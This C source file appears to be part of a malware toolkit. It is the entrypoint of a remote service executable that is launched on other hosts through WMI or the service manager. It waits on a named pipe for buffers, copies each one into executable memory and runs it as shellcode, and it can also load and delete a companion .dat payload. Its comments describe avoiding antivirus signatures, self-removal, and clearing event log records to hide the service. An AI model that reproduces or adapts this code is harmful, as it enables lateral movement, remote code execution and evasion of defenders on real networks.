/*
	rse.c
	Entrypoint for remote service exe file
	May be executed
	1) CreateProcess() via WMI from remote host, from %windir% with random name
	2) By SCM via remote SCM api invoke, from the same ^

	NB:
	1) Multiple remote hosts may attempt to execute it's copies of rse simultaneously.
	So it should perform to self removal in case of failure of creating uniq shared resource,
	like pipe server or some pre-defined mutex

	2) To avoid using too much code suitable for signatures, this code may omit reporting SCM about
	successfull startup. Runner code should handle SCM error on service start correctly and pass 
	execution to next step check for a working shared resource (for ex., named pipe)
*/


// enable this to include routines for searching companion .dat file at the place of self exe
#define COMPANION_FILE_SUPPORT


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")


#include <windows.h>

// instruct pipeworks module to not compile routines dedicated to envelope add/remove to reduce size of resulting exe
// this value will also remove ability to answer on client connection in server part
// this should be done at project settings, check it
#ifndef NO_TRANSPORT_ENVELOPE
#error This project should be compiled with NO_TRANSPORT_ENVELOPE defined at compiler settings (/D directive)
#endif

#include "..\inc\mem.h"
#include "..\inc\dbg.h"
#include "..\inc\CryptoStrings.h"
#include "..\inc\PipeWorks.h"
#include "..\Shellcode\shellcode.h"

#include "..\shared\config.h"



#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, "..\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\amd64\\ntdll.lib")
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, "..\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\i386\\ntdll.lib")
#else
	#error Unknown target CPU, no system libs can be found
#endif



#include "rse.h"

BOOL g_fBufferExecuted;	// indicating we have executed remote buffer, so it is safe to terminate self process
BOOL g_fStartedAsService;	// set to TRUE when registration with SCM was ok

// globals needed for working as service
SERVICE_STATUS          gSvcStatus;
SERVICE_STATUS_HANDLE   gSvcStatusHandle;




/*
	Callback to process data received by pipe server
*/
BOOL CALLBACK PipeCallback(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	BOOL bRes = FALSE;	// cb processing result
	LPVOID pExecMem = NULL;
	ShellcodeEntrypoint seShellcodeProc;	// ^ caster ptr to call shellcode's entry
	SHELLCODE_CONTEXT *pSContext;	// casts start of bin buffer as this structure

	DbgPrint("entered, ptr=%04Xh len=%u", dcp->pInBuffer, dcp->lInBufferLen);

	// copy input buffer to an executable mem chunk
	if (!(pExecMem = VirtualAlloc(NULL, dcp->lInBufferLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) { DbgPrint("ERR: failed to VirtualAlloc() %u bytes, le %u", dcp->lInBufferLen, GetLastError()); return FALSE; }
	memcpy(pExecMem, dcp->pInBuffer, dcp->lInBufferLen);

	pSContext = (SHELLCODE_CONTEXT *)pExecMem;

	// do the call
	__try {

		// data in received buffer assumed to be in following manner
		// <shellcode_context(VARLEN STRUCT)><shellcode><idd xored><wdd xored><serialized binpack itself for later parsing>

		DbgPrint("about to exec shellcode..");

		// calc ptr to shellcode's EP
		seShellcodeProc = (ShellcodeEntrypoint)( (SIZE_T)pExecMem + pSContext->dwStructureLen + pSContext->dwShellcodeEntrypointOffset);

		// call shellcode passing it ptr to context structure
		seShellcodeProc(pExecMem);

		DbgPrint("exec done");

		g_fBufferExecuted = TRUE;

		if (!g_fStartedAsService) { DbgPrint("no need to notify SCM, terminating self"); ExitProcess(0); }

		bRes = TRUE;

	} __except (1) { DbgPrint("ERR: exception during chunk execution"); }
	
	DbgPrint("NOTE: chunk execution finished");

	// possibly it is a good place to terminate host process, or take some
	// other action according to call result of chunk buffer
	// Note: to gracefully close connection to client pipe, this callback should do return
	return bRes;

}

// status reporter from msdn
VOID ReportSvcStatus(DWORD dwCurrentState,
	DWORD dwWin32ExitCode,
	DWORD dwWaitHint)
{
	static DWORD dwCheckPoint = 1;

	// Fill in the SERVICE_STATUS structure.

	gSvcStatus.dwCurrentState = dwCurrentState;
	gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
	gSvcStatus.dwWaitHint = dwWaitHint;

	if (dwCurrentState == SERVICE_START_PENDING)
		gSvcStatus.dwControlsAccepted = 0;
	else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	if ((dwCurrentState == SERVICE_RUNNING) ||
		(dwCurrentState == SERVICE_STOPPED))
		gSvcStatus.dwCheckPoint = 0;
	else gSvcStatus.dwCheckPoint = dwCheckPoint++;

	// Report the status of the service to the SCM
	DbgPrint("sending status %u", dwCurrentState);
	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
	DbgPrint("status sent");
}


VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
{
	// Handle the requested control code. 

	switch (dwCtrl)
	{
	case SERVICE_CONTROL_STOP:
		DbgPrint("SERVICE_CONTROL_STOP received, waiting for g_fBufferExecuted..");
		while (!g_fBufferExecuted) { Sleep(200); }
		DbgPrint("safe to exit");
		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		ExitProcess(0);
		return;


	default:
		DbgPrint("code %u", dwCtrl);
		break;
	}

}



/*
	entrypoint called by SCM. Need to register self as service in SCM database
*/
VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
	DbgPrint("entered");

	if (!(gSvcStatusHandle = RegisterServiceCtrlHandler(TEXT(""), SvcCtrlHandler))) { DbgPrint("ERR: RegisterServiceCtrlHandler() failed with code %04Xh", GetLastError()); }
	else { DbgPrint("ctrl handler registered ok"); }


	// These SERVICE_STATUS members remain as set here

	gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	gSvcStatus.dwServiceSpecificExitCode = 0;

	// Report initial status to the SCM
	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR,  0);


}


/*
	Called from EP to register self in SCM database.
	If not performed when executed as service, a warning record in EventLog will be placed
*/
VOID RegisterAsService()
{
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{ TEXT(""), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
		{ NULL, NULL }
	};

	DbgPrint("entered");
	if (!(g_fStartedAsService = StartServiceCtrlDispatcher(DispatchTable))) { DbgPrint("ERR: StartServiceCtrlDispatcher() failed with code %04Xh", GetLastError()); }
	else { DbgPrint("SCM notified OK"); }
}


#ifdef COMPANION_FILE_SUPPORT
/*
	Checks for companion file with binpack
*/
BOOL rseCheckCompanionFile(CLIENTDISPATCHERFUNC cdCallback)
{
	BOOL bRes = FALSE;	// func result
	DISPATCHER_CALLBACK_PARAMS *dcp = NULL;	// callback params answer
	LPWSTR wszPath = NULL;
	LPWSTR wszS = NULL;	// decrypt buffer
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwDummy = 0;

	do {	// not a loop

		if (!cdCallback) { DbgPrint("ERR: no param passed"); break; }

		// alloc params buffer
		if (!(dcp = (DISPATCHER_CALLBACK_PARAMS *)my_alloc(sizeof(DISPATCHER_CALLBACK_PARAMS)))) { break; }

		// query path of self file
		wszPath = (LPWSTR)my_alloc(1024);
		if (!GetModuleFileName(NULL, wszPath, 512)) { DbgPrint("ERR: GetModuleFileName() failed, le %p", GetLastError()); break; }
		
		wszS = CRSTRW(".dat", "\xfc\xdf\x87\x00\xf8\xdf\xc9\x0c\xed\xd3\xd8");
		lstrcat(wszPath, wszS);
		
		DbgPrint("binpack target [%ws]", wszPath);

		// attempt to open that file
		hFile = CreateFile(wszPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile) { DbgPrint("NOTE: open file failed, le %p", GetLastError()); break; }

		// query it's size
		if (!(dcp->lInBufferLen = GetFileSize(hFile, &dwDummy))) { DbgPrint("ERR: file size query fail, le %p", GetLastError()); break; }

		// alloc buffer
		if (!(dcp->pInBuffer = my_alloc(dcp->lInBufferLen))) { DbgPrint("ERR: failed to alloc %u bytes", dcp->lInBufferLen); break; }

		// read file contents
		if (!ReadFile(hFile, dcp->pInBuffer, dcp->lInBufferLen, &dwDummy, NULL)) { DbgPrint("ERR: ReadFile() failed, le %p", GetLastError()); break; }

		// done ok, close file handle
		CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;

		// call cb
		DbgPrint("read %u ok, calling cb...", dcp->lInBufferLen);
		cdCallback(dcp);
		DbgPrint("cb returned");

		// if got here, attempt to remove binpack
		DeleteFile(wszPath);

	} while (FALSE);	// not a loop

	if (dcp) { my_free(dcp); }
	if (wszPath) { my_free(wszPath); }
	if (wszS) { my_free(wszS); }
	if (INVALID_HANDLE_VALUE != hFile) { CloseHandle(hFile); }

	return bRes;
}
#endif

// entrypoint function for service exe 
VOID __stdcall main()
{

	DbgPrint("entered");

	// init global flag indicating a buffer from remote machine was executed
	g_fBufferExecuted = FALSE;

	// do init and returns right back
	pwInitPipeServerAsync(&PipeCallback);

#ifdef COMPANION_FILE_SUPPORT
	// check for .dat in folder with our host file - needed for rdp replication when remote host is not accessible via pipes
	rseCheckCompanionFile(&PipeCallback);
#endif

	// register as service. NB: event log will receive notifications on start pending, start, stop pending and stop event
	// not calling this leads to warning in event log about service failed to start
	// In all cases event log saves name of our service (usually a trash random string)
	// So some other code should either (a) use normal name or (b) clear event log's records
	RegisterAsService(); // internally inits g_fStartedAsService var


	
	DbgPrint("init done");

	Sleep(INFINITE);

	//ExitProcess(0);
}






